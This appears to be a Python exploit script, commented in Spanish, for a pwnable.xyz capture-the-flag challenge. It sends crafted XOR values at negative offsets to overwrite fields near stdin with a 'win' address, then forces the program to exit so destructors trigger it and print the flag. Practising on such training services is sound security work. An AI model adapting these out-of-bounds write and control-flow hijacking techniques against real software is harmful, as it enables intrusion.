#!/usr/bin/env python3
"""
Enfoque diferente: NO crashear el programa
En su lugar, explotar de forma MÁS SUTIL
"""
import socket
import time
import sys

host = "svc.pwnable.xyz"
port = 30029

print("Conectando...")
time.sleep(5)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(40)
s.connect((host, port))

banner = s.recv(1024)
print(banner.decode())

win = 0xa21

print("\n=== Nueva estrategia: NO crashear ===")
print("Voy a sobrescribir campos que NO causan crash inmediato")
print("pero que podrían ejecutar código cuando el programa termina\n")

# Sobrescribir campos -9, -7, -6 (NO -8, NO -5 que causan crash)
fields = [
    (-9, "stdin+184"),
    (-7, "stdin+200"),
    (-6, "stdin+208"),
]

print("Sobrescribiendo con win...")
for offset, desc in fields:
    b = abs(offset) * 777
    a = win ^ b
    print(f"  {desc} (offset {offset})")
    s.sendall(f"{a} {b} {offset}\n".encode())
    time.sleep(0.2)

# Leer respuestas
time.sleep(0.5)
try:
    s.recv(8192, socket.MSG_DONTWAIT)
except:
    pass

print("\nAhora voy a hacer que el programa TERMINE normalmente")
print("para que ejecute destructores...")

# Llenar result[] también
print("\nLlenando result[] con win...")
for i in range(1, 10):
    s.sendall(f"{win ^ (i*33)} {i*33} {i}\n".encode())
    time.sleep(0.1)

time.sleep(0.5)
try:
    s.recv(8192, socket.MSG_DONTWAIT)
except:
    pass

# Ahora intentar hacer que termine
print("\nIntentando terminar el programa (enviar input inválido)...")

invalid_inputs = [
    "AAAA\n",
    "\n",
    "0 0 0\n",
    "1 2\n",
]

s.settimeout(2)

for inp in invalid_inputs:
    print(f"  Enviando: {repr(inp.strip())}")
    try:
        s.sendall(inp.encode())
        time.sleep(1)
        
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except:
            pass
        
        if data:
            decoded = data.decode()
            print(f"    Respuesta: {decoded[:100]}")
            
            if "flag" in decoded.lower() or "{" in decoded:
                print("\n" + "="*60)
                print("¡POSIBLE FLAG!")
                print(decoded)
                print("="*60)
                sys.exit(0)
    except:
        print("    (error/crash)")

s.close()
print("\nFin")